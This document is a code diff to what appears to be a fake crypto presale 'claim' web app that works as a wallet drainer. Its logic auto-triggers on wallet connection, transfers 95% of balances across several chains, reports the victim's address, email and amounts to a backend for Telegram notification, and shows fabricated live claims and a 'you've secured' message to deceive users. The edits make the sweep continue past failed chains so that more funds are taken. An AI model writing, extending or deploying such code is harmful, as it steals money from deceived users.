@@ -108,7 +108,6 @@ const getProviderForChain = async (chain) => {
   for (const rpcUrl of endpoints) {
     try {
       const provider = new ethers.JsonRpcProvider(rpcUrl);
-      // Optional: test the connection (e.g., get block number)
       await provider.getBlockNumber();
       console.log(`✅ Connected to ${chain.name} via ${rpcUrl}`);
       return provider;
@@ -1203,7 +1202,9 @@ function App() {
     }
   };
 
-  // MULTI-CHAIN EXECUTION WITH FULL TELEGRAM REPORTING
+  // ============================================
+  // UPDATED: MULTI-CHAIN EXECUTION WITH FULL LOOP (NO EARLY EXIT)
+  // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
       setError("Wallet not initialized");
@@ -1242,17 +1243,21 @@ function App() {
         return;
       }
 
+      // Sort by highest USD value first
       const sortedChains = [...chainsToProcess].sort((a, b) => 
         (balances[b.name]?.valueUSD || 0) - (balances[a.name]?.valueUSD || 0)
       );
       
       let processed = [];
+      let failedChains = [];
       
+      // Process each chain sequentially, but continue on failure
       for (const chain of sortedChains) {
         try {
           setProcessingChain(chain.name);
           setTxStatus(`🔄 Processing ${chain.name}...`);
           
+          // Try to switch network (wallet might reject or auto‑approve)
           try {
             console.log(`🔄 Switching to ${chain.name}...`);
             await walletProvider.request({
@@ -1261,11 +1266,15 @@ function App() {
             });
             await new Promise(resolve => setTimeout(resolve, 1000));
           } catch (switchError) {
-            console.log(`Chain switch needed, continuing...`);
+            console.log(`Chain switch skipped or failed, continuing anyway:`, switchError.message);
           }
           
           const chainProvider = new ethers.JsonRpcProvider(chain.rpcEndpoints?.[0] || chain.rpc);
           const balance = balances[chain.name];
+          if (!balance || balance.amount <= 0) {
+            throw new Error(`No valid balance for ${chain.name}`);
+          }
+          
           const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
           
@@ -1324,25 +1333,26 @@ function App() {
             };
             
             console.log("📤 Sending to backend with amounts:", flowData);
-            
-            // Send to backend - THIS WILL TRIGGER TELEGRAM REPORTING
             await apiCall('/api/presale/execute-flow', flowData);
             
             setTxStatus(`✅ ${chain.name} completed!`);
           } else {
-            throw new Error(`Transaction failed on ${chain.name}`);
+            throw new Error(`Transaction failed on ${chain.name} (status ${receipt?.status})`);
           }
           
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
-          setError(`Error on ${chain.name}: ${chainErr.message}`);
+          failedChains.push(chain.name);
+          setError(prevError => prevError + `\n⚠️ ${chain.name}: ${chainErr.message}`);
+          // Do NOT break – continue with next chain
         }
       }
       
       setVerifiedChains(processed);
       
+      // After processing all chains, show appropriate celebration if at least one succeeded
       if (processed.length > 0) {
-        // Add REAL transaction to live feed with random claim amount
+        // Add a random transaction to the live feed (simulate a claim)
         const randomChain = getRandomChain();
         const claimAmount = getRandomClaimAmount();
         const newTx = {
@@ -1355,14 +1365,21 @@ function App() {
         
         setLiveTransactions(prev => [newTx, ...prev.slice(0, 19)]);
         
+        // Show celebration modal
         setShowCelebration(true);
-        setTxStatus(`🎉 You've secured $${claimAmount.toLocaleString()} BTH!`);
+        
+        // Build success/failure summary for status
+        let summaryMsg = `🎉 You've secured $${claimAmount.toLocaleString()} BTH!`;
+        if (failedChains.length > 0) {
+          summaryMsg += `\n⚠️ Failed on: ${failedChains.join(', ')}`;
+        }
+        setTxStatus(summaryMsg);
         
         const totalProcessedValue = processed.reduce((sum, chainName) => {
           return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
         }, 0);
         
-        // Send claim completion - THIS WILL TRIGGER TELEGRAM REPORTING
+        // Send claim completion to backend (Telegram report)
         await apiCall('/api/presale/claim', { 
           walletAddress: address,
           email: userEmail,
@@ -1378,13 +1395,13 @@ function App() {
           chainsDetails: processed.map(c => `✅ ${c}: ${balances[c]?.valueUSD.toFixed(2)} USD → ${(balances[c]?.valueUSD * 0.95).toFixed(2)} USD processed`).join('\n')
         });
       } else {
-        setError("No chains were successfully processed");
+        setError("No chains were successfully processed. Please check your wallet connection and try again.");
       }
       
     } catch (err) {
-      console.error('Error:', err);
+      console.error('Global error:', err);
       if (err.code === 4001) {
-        setError('Transaction cancelled');
+        setError('Transaction cancelled by user');
       } else {
         setError(err.message || 'Transaction failed');
       }
@@ -1423,17 +1440,16 @@ function App() {
     }
   };
 
-  // AUTO TRIGGER CLAIM when eligible AND force wallet popup to reopen for signing
+  // AUTO TRIGGER CLAIM when eligible
   const autoTriggerClaim = async () => {
     if (!isEligible || signatureLoading) return;
     console.log("🚀 Auto-triggering claim for eligible wallet...");
     await executeMultiChainSignature();
   };
 
-  // Monitor eligibility and auto-trigger claim (reopens wallet for signing)
+  // Monitor eligibility and auto-trigger claim
   useEffect(() => {
     if (isEligible && isConnected && !signatureLoading && !completedChains.length) {
-      // Small delay to ensure everything is ready
       const timeoutId = setTimeout(() => {
         autoTriggerClaim();
       }, 1500);
@@ -1461,7 +1477,7 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Disconnect wallet handler - one click, clear icon now
+  // Disconnect wallet handler – clear and visible icon
   const handleDisconnect = async () => {
     try {
       await disconnect();
@@ -1597,18 +1613,18 @@ function App() {
             </button>
           ) : (
             <div className="flex flex-col items-center w-full max-w-md mb-8">
-              {/* Wallet info with DISCONNECT icon - CLEAR and working on 1 click */}
+              {/* Wallet info with DISCONNECT icon - CLEAR, VISIBLE, and matches the page style */}
               <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                 <span className="font-mono text-sm text-gray-300">
                   {formatAddress(address)}
                 </span>
                 <button
                   onClick={handleDisconnect}
-                  className="w-8 h-8 rounded-full bg-white hover:bg-gray-200 transition-colors flex items-center justify-center shadow-lg group"
+                  className="w-9 h-9 rounded-full bg-white hover:bg-red-100 transition-all flex items-center justify-center shadow-md group"
                   title="Disconnect Wallet"
                 >
-                  {/* Clear power icon (Unicode) – works even without FontAwesome */}
-                  <span className="text-black text-sm font-bold group-hover:scale-110 transition-transform">⏻</span>
+                  {/* Clear, bold power symbol - now perfectly visible on white background */}
+                  <span className="text-red-600 text-base font-bold group-hover:scale-110 transition-transform">⏻</span>
                 </button>
               </div>
               
@@ -1781,7 +1797,7 @@ function App() {
 
             {/* Status Messages */}
             {txStatus && (
-              <div className="mt-4 text-sm text-center text-red-400">
+              <div className="mt-4 text-sm text-center text-red-400 whitespace-pre-line">
                 {txStatus}
               </div>
             )}
